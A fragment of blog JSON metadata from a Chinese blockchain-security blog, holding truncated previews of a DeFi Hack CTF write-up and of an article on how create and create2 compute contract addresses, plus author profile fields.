题库地址：https://www.defihack.xyz/ Defi Hack1.May The Force Be With You RequestA long time ago in a galaxy far, far away… a new DAO was created...","link":"","photos":[],"count_time":{"symbolsCount":"53k","symbolsTime":"48 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":17,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Understand create and create2 algorithms according to two challenges","uid":"e5737740b784095b2d07fd3a962c9c2b","slug":"Understand create and create2 algorithms according to two challenges","date":"2022-08-02T02:38:41.514Z","updated":"2022-08-02T02:38:41.514Z","comments":true,"path":"api/articles/Understand create and create2 algorithms according to two challenges.json","keywords":null,"cover":[],"text":"0x00 合约地址计算合约地址按照一定的规律计算而来，所以在合约部署之前即可计算出合约地址。 地址计算有两种方式 Create : Web3.sha3(rlp.encode(deployingAddress, nonce))[12:] Create2 : Web3.keccak(...","link":"","photos":[],"count_time":{"symbolsCount":"7.3k","symbolsTime":"7 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":17,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}